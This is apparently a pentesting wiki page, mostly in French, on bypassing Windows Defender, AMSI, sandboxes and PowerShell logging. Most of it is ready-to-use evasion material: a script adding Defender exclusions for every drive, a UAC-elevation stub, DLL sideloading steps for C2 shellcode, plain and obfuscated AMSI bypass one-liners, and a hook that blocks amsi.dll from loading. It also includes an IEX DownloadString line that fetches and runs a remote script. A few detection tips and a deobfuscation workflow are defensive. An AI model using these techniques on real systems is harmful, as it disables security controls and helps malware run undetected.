# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Cette page a été initialement écrite par** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot): Un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender): Un outil pour empêcher Windows Defender de fonctionner en simulant un autre AV.
- [Désactiver Defender si vous êtes admin](basic-powershell-for-pentesters/README.md)

### Leurre UAC de type installateur avant de manipuler Defender

Des loaders publics se faisant passer pour des cheats de jeux sont souvent distribués sous forme d'installateurs Node.js/Nexe non signés qui d'abord **demandent l'élévation à l'utilisateur** et ne neutralisent Defender qu'ensuite. Le déroulé est simple :

1. Vérifier le contexte administratif avec `net session`. La commande ne réussit que lorsque l'appelant possède les droits admin, donc un échec indique que le loader s'exécute en tant qu'utilisateur standard.
2. Se relancer immédiatement avec le verbe `RunAs` pour déclencher l'invite de consentement UAC attendue tout en préservant la ligne de commande originale.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Les victimes croient déjà installer un logiciel “cracked”, donc l'invite est généralement acceptée, donnant au malware les droits nécessaires pour modifier la politique de Defender.

### Exclusions globales `MpPreference` pour chaque lettre de lecteur

Une fois élevées, les chaînes de style GachiLoader maximisent les angles morts de Defender au lieu de désactiver complètement le service. Le loader tue d'abord le watchdog GUI (`taskkill /F /IM SecHealthUI.exe`) puis pousse des **exclusions extrêmement larges** de sorte que chaque profil utilisateur, répertoire système et disque amovible devienne impossible à analyser:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.
- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.

Because no Defender service is stopped, naïve health checks keep reporting “antivirus active” even though real-time inspection never touches those paths.

## **Méthodologie d'évasion AV**

Actuellement, les AVs utilisent différentes méthodes pour déterminer si un fichier est malveillant ou non : détection statique, analyse dynamique, et pour les EDRs les plus avancés, analyse comportementale.

### **Détection statique**

La détection statique se fait en marquant des chaînes connues malveillantes ou des tableaux d'octets dans un binaire ou un script, et en extrayant aussi des informations depuis le fichier lui‑même (par ex. file description, company name, digital signatures, icon, checksum, etc.). Cela signifie qu'utiliser des outils publics connus peut vous faire attraper plus facilement, car ils ont probablement déjà été analysés et marqués comme malveillants. Il y a plusieurs façons de contourner ce type de détection :

- **Chiffrement**

Si vous cryptez le binaire, il n'y aura aucun moyen pour un AV de détecter votre programme, mais vous aurez besoin d'une sorte de loader pour décrypter et exécuter le programme en mémoire.

- **Obfuscation**

Parfois, il suffit de changer quelques chaînes dans votre binaire ou script pour passer l'AV, mais cela peut être une tâche longue selon ce que vous essayez d'obfusquer.

- **Outils personnalisés**

Si vous développez vos propres outils, il n'y aura pas de signatures connues, mais cela demande beaucoup de temps et d'efforts.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.

### **Analyse dynamique**

L'analyse dynamique consiste à exécuter votre binaire dans un sandbox et à surveiller les activités malveillantes (par ex. essayer de décrypter et lire les mots de passe du navigateur, effectuer un minidump sur LSASS, etc.). Cette partie peut être un peu plus délicate, mais voici quelques techniques pour échapper aux sandboxes.

- **Sleep before execution** Selon l'implémentation, cela peut être un excellent moyen de contourner l'analyse dynamique des AVs. Les AVs disposent d'un temps très court pour analyser les fichiers afin de ne pas interrompre le flux de travail de l'utilisateur, donc utiliser des sleeps longs peut perturber l'analyse des binaires. Le problème est que beaucoup de sandboxes d'AVs peuvent simplement sauter le sleep selon la façon dont il est implémenté.
- **Checking machine's resources** En général, les Sandboxes disposent de très peu de ressources (par ex. < 2GB RAM), sinon elles ralentiraient la machine de l'utilisateur. Vous pouvez aussi être très créatif ici, par exemple en vérifiant la température du CPU ou même la vitesse des ventilateurs, tout ne sera pas nécessairement implémenté dans le sandbox.
- **Machine-specific checks** Si vous voulez cibler un utilisateur dont la station de travail est jointe au domaine "contoso.local", vous pouvez vérifier le domaine de l'ordinateur pour voir s'il correspond à celui que vous avez spécifié ; si ce n'est pas le cas, vous pouvez faire quitter votre programme.

Il s'avère que le computername du Sandbox de Microsoft Defender est HAL9TH, donc, vous pouvez vérifier le nom de l'ordinateur dans votre malware avant la détonation ; si le nom correspond à HAL9TH, cela signifie que vous êtes dans le defender's sandbox, et vous pouvez faire quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Quelques autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour contrer les Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme nous l'avons dit précédemment dans ce post, les outils publics finiront par être détectés, donc, vous devriez vous poser une question :

Par exemple, si vous voulez dumper LSASS, **avez‑vous vraiment besoin d'utiliser mimikatz** ? Ou pourriez‑vous utiliser un autre projet moins connu qui dump aussi LSASS.

La bonne réponse est probablement la seconde. Prenons mimikatz comme exemple : c'est probablement un des, si ce n'est le plus, morceaux de malware le plus marqué par les AVs et EDRs ; bien que le projet soit super cool, c'est aussi un cauchemar pour contourner les AVs, donc cherchez des alternatives pour ce que vous voulez accomplir.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Cette commande affichera la liste des programmes susceptibles de DLL hijacking dans "C:\Program Files\\" et les fichiers DLL qu'ils tentent de charger.

Je vous recommande vivement **explore DLL Hijackable/Sideloadable programs yourself**, cette technique est assez furtive si elle est bien exécutée, mais si vous utilisez des programmes DLL Sideloadable connus publiquement, vous pouvez être facilement repéré.

Le simple fait de placer une DLL malveillante portant le nom qu'un programme s'attend à charger ne lancera pas votre payload, car le programme attend des fonctions spécifiques dans cette DLL. Pour résoudre ce problème, nous utiliserons une autre technique appelée **DLL Proxying/Forwarding**.

**DLL Proxying** transfère les appels effectués par un programme depuis la DLL proxy (et malveillante) vers la DLL originale, préservant ainsi la fonctionnalité du programme tout en permettant de gérer l'exécution de votre payload.

J'utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j'ai suivies :
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
La dernière commande nous donnera 2 fichiers : un modèle de code source de DLL, et la DLL originale renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Abuser les exports redirigés (ForwardSideLoading)

Les modules PE Windows peuvent exporter des fonctions qui sont en réalité des "forwarders" : au lieu de pointer vers du code, l'entrée d'export contient une chaîne ASCII de la forme `TargetDll.TargetFunc`. Lorsqu'un appelant résout l'export, le Windows loader va :

- Charger `TargetDll` si ce n'est pas déjà fait
- Résoudre `TargetFunc` à partir de celui-ci

Comportements clés à comprendre :
- Si `TargetDll` est un KnownDLL, il est fourni depuis l'espace de noms protégé KnownDLLs (par ex., ntdll, kernelbase, ole32).
- Si `TargetDll` n'est pas un KnownDLL, l'ordre normal de recherche des DLL est utilisé, ce qui inclut le répertoire du module qui effectue la résolution du forward.

Ceci permet une primitive de sideloading indirecte : trouvez une DLL signée qui exporte une fonction forwardée vers un nom de module non-KnownDLL, puis placez cette DLL signée dans le même répertoire qu'une DLL contrôlée par l'attaquant nommée exactement comme le module cible forwardé. Lorsque l'export forwardé est invoqué, le loader résout le forward et charge votre DLL depuis le même répertoire, exécutant votre DllMain.

Exemple observé sur Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` n'est pas un KnownDLL, il est donc résolu selon l'ordre de recherche normal.

PoC (copy-paste):
1) Copier la DLL système signée dans un dossier accessible en écriture
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez un `NCRYPTPROV.dll` malveillant dans le même dossier. Un DllMain minimal suffit pour obtenir l'exécution de code ; vous n'avez pas besoin d'implémenter la fonction forwardée pour déclencher DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Déclencher le transfert avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportement observé:
- rundll32 (signed) charge le side-by-side `keyiso.dll` (signed)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le loader suit le forward vers `NCRYPTPROV.SetAuditingInterface`
- Le loader charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n'est pas implémentée, vous obtiendrez une erreur "missing API" seulement après que `DllMain` se soit déjà exécuté

Conseils pour la chasse :
- Concentrez-vous sur les forwarded exports dont le module cible n'est pas un KnownDLL. Les KnownDLLs sont listés sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les forwarded exports avec des outils tels que:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consultez l'inventaire des forwarders Windows 11 pour rechercher des candidats: https://hexacorn.com/d/apis_fwd.txt

Idées de détection/défense:
- Surveiller les LOLBins (e.g., rundll32.exe) chargeant des DLL signées depuis des chemins non-système, suivies du chargement de non-KnownDLLs ayant le même nom de base depuis ce répertoire
- Alerter sur des chaînes processus/module comme : `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` dans des chemins inscriptibles par l'utilisateur
- Appliquer des politiques d'intégrité du code (WDAC/AppLocker) et refuser write+execute dans les répertoires d'application

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'évasion n'est qu'un jeu du chat et de la souris : ce qui fonctionne aujourd'hui peut être détecté demain, donc ne comptez jamais sur un seul outil ; si possible, essayez d'enchaîner plusieurs techniques d'évasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Les EDRs placent souvent des **user-mode inline hooks** sur les syscall stubs de `ntdll.dll`. Pour contourner ces hooks, vous pouvez générer des stubs syscall **directs** ou **indirects** qui chargent le **SSN** (System Service Number) correct et effectuent la transition en kernel mode sans exécuter le point d'entrée export hooké.

**Invocation options:**
- **Direct (embedded)**: émettre une instruction `syscall`/`sysenter`/`SVC #0` dans le stub généré (aucun appel à l'export `ntdll`).
- **Indirect**: sauter dans un gadget `syscall` existant à l'intérieur de `ntdll` pour que la transition kernel semble provenir de `ntdll` (utile pour échapper aux heuristiques) ; **randomized indirect** choisit un gadget dans un pool par appel.
- **Egg-hunt**: éviter d'embarquer la séquence d'opcodes statique `0F 05` sur disque ; résoudre une séquence syscall à l'exécution.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: inférer les SSN en triant les syscall stubs par adresse virtuelle au lieu de lire les octets du stub.
- **SyscallsFromDisk**: mapper un `\KnownDlls\ntdll.dll` propre, lire les SSN depuis sa section `.text`, puis le démapper (contourne tous les hooks en mémoire).
- **RecycledGate**: combiner l'inférence SSN triée par VA avec une validation d'opcodes lorsque le stub est propre ; revenir à l'inférence par VA s'il est hooké.
- **HW Breakpoint**: définir DR0 sur l'instruction `syscall` et utiliser un VEH pour capturer le SSN depuis `EAX` à l'exécution, sans parser les octets hookés.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour empêcher "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Initialement, les AVs n'étaient capables d'analyser que les **fichiers sur le disque**, donc si vous pouviez exécuter des payloads **directement en mémoire**, l'AV ne pouvait rien faire pour l'empêcher, car il n'avait pas assez de visibilité.

La fonctionnalité AMSI est intégrée dans ces composants de Windows.

- User Account Control, or UAC (élévation d'EXE, COM, MSI, ou installation ActiveX)
- PowerShell (scripts, utilisation interactive, et évaluation dynamique de code)
- Windows Script Host (wscript.exe et cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Elle permet aux solutions antivirus d'inspecter le comportement des scripts en exposant le contenu des scripts sous une forme non chiffrée et non obfusquée.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez qu'il préfixe par `amsi:` puis le chemin vers l'exécutable à l'origine de l'exécution du script, dans ce cas, powershell.exe

Nous n'avons déposé aucun fichier sur le disque, mais avons quand même été détectés en mémoire à cause d'AMSI.

De plus, à partir de **.NET 4.8**, le code C# passe aussi par AMSI. Cela affecte même `Assembly.Load(byte[])` pour l'exécution en mémoire. C'est pourquoi il est recommandé d'utiliser des versions antérieures de .NET (comme 4.7.2 ou une version antérieure) pour l'exécution en mémoire si vous voulez échapper à AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Puisqu'AMSI fonctionne principalement avec des détections statiques, modifier les scripts que vous tentez de charger peut être un bon moyen d'éviter la détection.

Cependant, AMSI est capable de désobfusquer les scripts même s'ils ont plusieurs couches d'obfuscation, donc l'obfuscation peut être une mauvaise option selon la façon dont elle est réalisée. Cela rend l'évasion moins évidente. Parfois, il suffit de changer quelques noms de variables pour s'en sortir, donc cela dépend du niveau de détection.

- **AMSI Bypass**

Puisqu'AMSI est implémenté en chargeant une DLL dans le processus powershell (aussi cscript.exe, wscript.exe, etc.), il est possible de la manipuler facilement même en tant qu'utilisateur non privilégié. En raison de ce défaut d'implémentation d'AMSI, des chercheurs ont trouvé plusieurs moyens d'éviter son analyse.

**Forcing an Error**

Forcer l'initialisation d'AMSI à échouer (amsiInitFailed) fera en sorte qu'aucune analyse ne sera lancée pour le processus en cours. Ceci a été initialement divulgué par [Matt Graeber](https://twitter.com/mattifestation) et Microsoft a développé une signature pour empêcher une utilisation plus large.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Il a suffi d'une seule ligne de code powershell pour rendre AMSI inutilisable pour le processus powershell courant. Cette ligne a bien sûr été détectée par AMSI lui‑même, donc une modification est nécessaire pour pouvoir utiliser cette technique.

Voici un AMSI bypass modifié que j'ai pris depuis ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Gardez à l'esprit que cela sera probablement signalé une fois ce post publié ; n'en publiez donc aucun code si votre objectif est de rester indétecté.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Veuillez lire [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Bloquer AMSI en empêchant le chargement de amsi.dll (LdrLoadDll hook)

AMSI n'est initialisé qu'après le chargement de `amsi.dll` dans le processus courant. Un bypass robuste, indépendant du langage, consiste à placer un hook en mode utilisateur sur `ntdll!LdrLoadDll` qui renvoie une erreur lorsque le module demandé est `amsi.dll`. En conséquence, AMSI ne se charge jamais et aucune analyse n'a lieu pour ce processus.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Remarques
- Fonctionne avec PowerShell, WScript/CScript et les custom loaders (tout ce qui chargerait autrement AMSI).
- À associer à l'alimentation des scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) pour éviter les artefacts de ligne de commande longs.
- Observé utilisé par des loaders exécutés via des LOLBins (par ex., `regsvr32` appelant `DllRegisterServer`).

L'outil **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** génère également des scripts pour bypasser AMSI.
L'outil **[https://amsibypass.com/](https://amsibypass.com/)** génère aussi des scripts pour bypasser AMSI qui évitent la signature en randomisant les fonctions définies par l'utilisateur, les variables, les expressions de caractères et en appliquant une casse de caractères aléatoire aux mots-clés PowerShell pour éviter la signature.

**Remove the detected signature**

Vous pouvez utiliser un outil tel que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer la signature AMSI détectée de la mémoire du processus courant. Cet outil fonctionne en scannant la mémoire du processus courant à la recherche de la signature AMSI puis en la remplaçant par des instructions NOP, la supprimant effectivement de la mémoire.

**AV/EDR products that uses AMSI**

Vous pouvez trouver une liste de produits AV/EDR qui utilisent AMSI sur **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans qu'ils soient analysés par AMSI. Vous pouvez faire ceci:
```bash
powershell.exe -version 2
```
## Journalisation PowerShell

PowerShell logging est une fonctionnalité qui permet d'enregistrer toutes les commandes PowerShell exécutées sur un système. Cela peut être utile pour l'audit et le dépannage, mais cela peut aussi être un **problème pour les attaquants qui veulent échapper à la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Désactiver PowerShell Transcription et Module Logging** : Vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cet effet.
- **Utiliser PowerShell version 2** : Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans être scannés par AMSI. Vous pouvez faire : `powershell.exe -version 2`
- **Utiliser une session PowerShell non gérée** : Utilisez [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour lancer un PowerShell sans défenses (c'est ce que `powerpick` de Cobal Strike utilise).


## Obfuscation

> [!TIP]
> Plusieurs techniques d'obfuscation reposent sur le chiffrement des données, ce qui augmente l'entropie du binaire et facilite la détection par les AV et EDR. Faites attention à cela et n'appliquez éventuellement le chiffrement qu'à des sections spécifiques de votre code qui sont sensibles ou doivent être cachées.

### Déobfuscation des binaires .NET protégés par ConfuserEx

Lors de l'analyse de malwares qui utilisent ConfuserEx 2 (ou des forks commerciaux), il est courant de rencontrer plusieurs couches de protection qui bloquent les décompilateurs et les sandboxes. Le flux de travail ci‑dessous restaure de manière fiable un IL **proche de l'original** qui peut ensuite être décompilé en C# dans des outils tels que dnSpy ou ILSpy.

1.  Suppression de l'anti-tamper – ConfuserEx chiffre chaque *method body* et le déchiffre à l'intérieur du constructeur statique du *module* (`<Module>.cctor`). Cela modifie aussi le checksum PE de sorte que toute modification fera planter le binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`) qui peuvent être utiles lors de la création de votre propre unpacker.

2.  Récupération des symboles / du flux de contrôle – fournissez le fichier *clean* à **de4dot-cex** (un fork de de4dot conscient de ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – sélectionner le profil ConfuserEx 2  
• de4dot annulera le flattening du control-flow, restaurera les namespaces, classes et noms de variables originaux et déchiffrera les chaînes constantes.

3.  Suppression des proxy-call – ConfuserEx remplace les appels directs de méthodes par des wrappers légers (a.k.a *proxy calls*) pour compliquer la décompilation. Supprimez-les avec **ProxyCall-Remover** :
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Après cette étape, vous devriez observer des API .NET normales telles que `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire résultant dans dnSpy, recherchez de gros blobs Base64 ou l'utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` pour localiser la charge utile *réelle*. Souvent, le malware la stocke comme un tableau d'octets encodé TLV initialisé à l'intérieur de `<Module>.byte_0`.

La chaîne ci‑dessus restaure le flux d'exécution **sans** nécessiter l'exécution de l'échantillon malveillant — utile lorsqu'on travaille sur une station hors ligne.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute` qui peut être utilisé comme IOC pour trier automatiquement les échantillons.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Le but de ce projet est de fournir un fork open-source de la suite de compilation [LLVM](http://www.llvm.org/) capable d'améliorer la sécurité des logiciels via [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et le tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator démontre comment utiliser le langage `C++11/14` pour générer, au moment de la compilation, du obfuscated code sans utiliser d'outil externe et sans modifier le compilateur.
- [**obfy**](https://github.com/fritzone/obfy): Ajoute une couche d'opérations obfuscated générées par le template metaprogramming framework C++ qui rendra la vie de la personne voulant crack the application un peu plus difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz est un x64 binary obfuscator capable d'obfuscate différents fichiers pe, incluant : .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame est un simple metamorphic code engine pour exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator est un fine-grained code obfuscation framework pour les langages supportés par LLVM utilisant ROP (return-oriented programming). ROPfuscator obfuscates un programme au niveau du code assembleur en transformant les instructions régulières en ROP chains, contrecarrant notre conception naturelle du control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt est un .NET PE Crypter écrit en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor est capable de convertir des EXE/DLL existants en shellcode puis de les charger

## SmartScreen & MoTW

Vous avez peut-être vu cet écran lorsque vous téléchargez certains exécutables depuis Internet et les exécutez.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen fonctionne principalement avec une approche basée sur la réputation, ce qui signifie que les applications peu fréquemment téléchargées déclencheront SmartScreen, alertant et empêchant ainsi l'utilisateur final d'exécuter le fichier (bien que le fichier puisse toujours être exécuté en cliquant sur More Info -> Run anyway).

**MoTW** (Mark of The Web) est un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) portant le nom Zone.Identifier qui est automatiquement créé lors du téléchargement de fichiers depuis Internet, avec l'URL depuis laquelle ils ont été téléchargés.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification de l'ADS Zone.Identifier pour un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!TIP]
